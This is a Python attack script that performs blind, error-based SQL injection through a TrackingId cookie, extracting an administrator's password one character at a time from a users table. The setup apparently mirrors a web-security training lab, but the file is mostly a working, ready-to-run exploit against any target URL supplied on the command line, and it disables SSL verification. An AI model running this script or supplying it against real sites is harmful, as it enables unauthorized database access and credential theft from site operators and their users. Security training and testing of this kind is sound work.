import argparse
import logging
import re
import string
import sys
import requests
from typing import Tuple, Optional
import warnings
import urllib3

# Suppress SSL certificate verification warnings (commonly seen in testing environments)
warnings.simplefilter('ignore', urllib3.exceptions.InsecureRequestWarning)

# Configure logging to display messages (info, debug, etc.)
logging.basicConfig(
    level=logging.INFO,  # Default log level
    format='[%(levelname)s] %(message)s'  # Log format
)

def ask_to_continue(debug_mode: bool) -> bool:
    """
    Ask the user whether to continue if the debug_mode is enabled.
    This is useful when you want to make sure users are aware of each action taken.

    Args:
        debug_mode (bool): If True, prompts the user to continue after each major action.

    Returns:
        bool: True if the user wants to continue or debug_mode is False, False otherwise.
    """
    if debug_mode:
        while True:
            # Prompt the user for input
            answer = input("Do you want to continue? (Y/N): ").strip().lower()
            if answer == 'y':
                return True
            elif answer == 'n':
                return False
            else:
                logging.info("Invalid input. Please enter Y or N.")
    return True

def start_session(base_url: str) -> Optional[Tuple[str, str]]:
    """
    Start a new HTTP session, retrieve session and TrackingId cookies.

    Args:
        base_url (str): The base URL of the target web application.

    Returns:
        Optional[Tuple[str, str]]: A tuple with session cookie and tracking ID, or None if the session can't be started.
    """
    session_url = base_url + "/"
    session = requests.Session()  # Create a new session object

    # Attempt to connect to the target URL
    try:
        response = session.get(session_url, verify=False)  # Disable SSL verification for testing
        response.raise_for_status()  # Raise error if HTTP response is not 200 (OK)
    except requests.exceptions.RequestException as e:
        logging.error(f"Failed to start session with {session_url}: {e}")
        return None  # Return None if the session can't be started

    # Log session details and extract cookies
    logging.info(f"Session started. Status Code: {response.status_code}")
    logging.debug(f"Response Header: {response.headers}")

    cookie_header = response.headers.get('Set-Cookie', '')
    session_value_match = re.search(r'session=([^;]+)', cookie_header)
    tracking_id_match = re.search(r'TrackingId=([^;]+)', cookie_header)

    if not session_value_match or not tracking_id_match:
        logging.error("Could not find necessary cookies in response.")
        return None  # Return None if cookies aren't found

    # Extract session and tracking ID cookies
    session_value = session_value_match.group(1)
    tracking_id = tracking_id_match.group(1)

    logging.debug(f"Extracted session: {session_value}")
    logging.debug(f"Extracted TrackingId: {tracking_id}")

    return session_value, tracking_id  # Return extracted cookies

def perform_conditional_errors_sql_injection(
    base_url: str,
    session_cookie: str,
    tracking_id_cookie: str
) -> Optional[str]:
    """
    Perform a SQL injection attack using conditional errors to extract the administrator's password.

    Args:
        base_url (str): The target URL for SQL injection.
        session_cookie (str): The session cookie value.
        tracking_id_cookie (str): The tracking ID cookie value.

    Returns:
        Optional[str]: Extracted password or None if the extraction failed.
    """
    characters_to_test = string.digits + string.ascii_letters  # Characters to try for the password
    logging.info(f"Characters to test: {characters_to_test}")

    extracted_password = ""
    position = 1  # Start testing the password from the first character

    logging.info(f"Starting SQL injection against: {base_url}")
    logging.info("This may take a while depending on password length and response times.")

    try:
        while True:
            found_char_at_position = None
            for char in characters_to_test:
                # Construct the SQL injection payload for testing each character in the password
                payload = f"'||(SELECT+CASE+WHEN+SUBSTR(password,{position},1)='{char}'+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+users+WHERE+username='administrator')||'"

                headers = {
                    'Cookie': f"TrackingId={tracking_id_cookie}{payload}; session={session_cookie}"
                }

                logging.debug(f"Testing payload: {payload}")
                logging.debug(f"Request Headers: {headers}")

                try:
                    # Send the request with the payload
                    response = requests.get(base_url, headers=headers, verify=False)
                    response.raise_for_status()
                except requests.exceptions.RequestException as e:
                    # If request fails, log and continue with the next character
                    logging.error(f"Request failed for char '{char}' at position {position}: {e}")
                    found_char_at_position = char
                    continue

                # If SQL error occurs (500), it means the character is correct
                if response.status_code == 500:
                    found_char_at_position = char
                    break  # Break once the correct character is found

            # If a character was found at this position, add it to the password
            if found_char_at_position:
                extracted_password += found_char_at_position
                logging.info(f"Position {position}: '{found_char_at_position}' - Current password: {extracted_password}")
                position += 1  # Move to the next position in the password
            else:
                logging.info(f"No character found at position {position}. Extraction complete.")
                break  # Exit the loop if no character is found

        logging.info(f"Extracted administrator password: {extracted_password}")
        return extracted_password

    except KeyboardInterrupt:
        logging.info(f"\nExtraction interrupted by user. Partial password: {extracted_password}")
        return extracted_password  # Return the partial password if interrupted
    except Exception as e:
        logging.critical(f"An unexpected error occurred: {e}")
        return None  # Return None in case of other errors

def parse_arguments():
    """
    Parse command-line arguments for the script.
    """
    parser = argparse.ArgumentParser(
        description='Script for performing conditional SQL injection attacks.',
        epilog='Example: python3 script.py --t http://example.com --loglevel DEBUG'
    )

    # Define command-line arguments
    parser.add_argument('--t', required=True, help='Target URL (e.g., http://example.com)')
    parser.add_argument('--user', required=False, help='Username for authentication (not used in current logic)')
    parser.add_argument('--cookie', required=False, help='Admin cookie (optional, not currently used)')
    parser.add_argument('--debug', action='store_true', help='Enable debug mode for extra prompts')
    parser.add_argument('--loglevel', default='INFO', choices=['INFO', 'DEBUG', 'ERROR', 'WARNING', 'CRITICAL'], help='Set log level')

    return parser.parse_args()

def main():
    """
    Main function to orchestrate the SQL injection process.
    """
    args = parse_arguments()

    # Set the logging level based on user input
    loglevel = getattr(logging, args.loglevel.upper(), logging.INFO)
    logging.getLogger().setLevel(loglevel)  # Set the root logger level

    target_url = args.t  # Get the target URL
    debug_mode = args.debug  # Check if debug mode is enabled

    logging.info("--- Starting session ---")
    if ask_to_continue(debug_mode):  # Confirm if the user wants to proceed
        session_data = start_session(target_url)
        if session_data is None:
            logging.error("Failed to obtain session and tracking ID. Exiting.")
            sys.exit(1)  # Exit if session setup fails
        session_value, tracking_id = session_data  # Extract session data
    else:
        logging.info("Session start aborted by user. Exiting.")
        sys.exit(0)  # Exit if user decides not to continue

    logging.info("--- Running conditional SQL injection ---")
    if ask_to_continue(debug_mode):  # Confirm if the user wants to proceed with SQL injection
        admin_password = perform_conditional_errors_sql_injection(target_url, session_value, tracking_id)
        if admin_password:
            logging.info(f"Successfully extracted administrator password: {admin_password}")
        else:
            logging.warning("Administrator password extraction failed or was interrupted.")
    else:
        logging.info("SQL injection aborted by user. Exiting.")
        sys.exit(0)  # Exit if user decides not to continue

if __name__ == "__main__":
    main()  # Run the main function when the script is executed

